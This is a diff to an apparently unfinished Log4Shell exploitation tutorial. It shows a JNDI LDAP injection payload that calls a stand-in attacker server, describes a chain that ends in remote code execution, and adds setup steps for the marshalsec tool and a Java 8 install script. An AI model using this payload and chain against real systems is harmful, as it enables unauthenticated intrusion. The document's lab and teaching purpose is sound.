@@ -81,3 +81,27 @@ The attack chain would be executed like this:<br/>
 - 1. `${jndi:ldap://attackerserver:1389/Resource}` -> reaches out to our LDAP Referral Server 
 - 2. The LDAP Referral Server then redirects the payload to our HTTP server
 - 3. The victim retrieves and executes the code on our HTTP server, which then gives us unauthenticated remote access
+
+We will utilize an open-source LDAP Referral Server utility: [marshalsec](https://github.com/mbechler/marshalsec)<br/>
+According the README.md file, Java 8 is required.<br/><br/>
+Link to download Java on Linux (we will need `jdk-8u181-linux-x64.tar.gz`): http://mirrors.rootpei.com/jdk/
+```bash
+#!/bin/bash
+
+sudo mkdir /usr/lib/jvm 
+
+cd /usr/lib/jvm
+
+sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz    # modify as needed
+
+sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
+sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
+sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1
+
+sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
+sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
+sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
+```
+```
+TO BE CONTINUED
+```
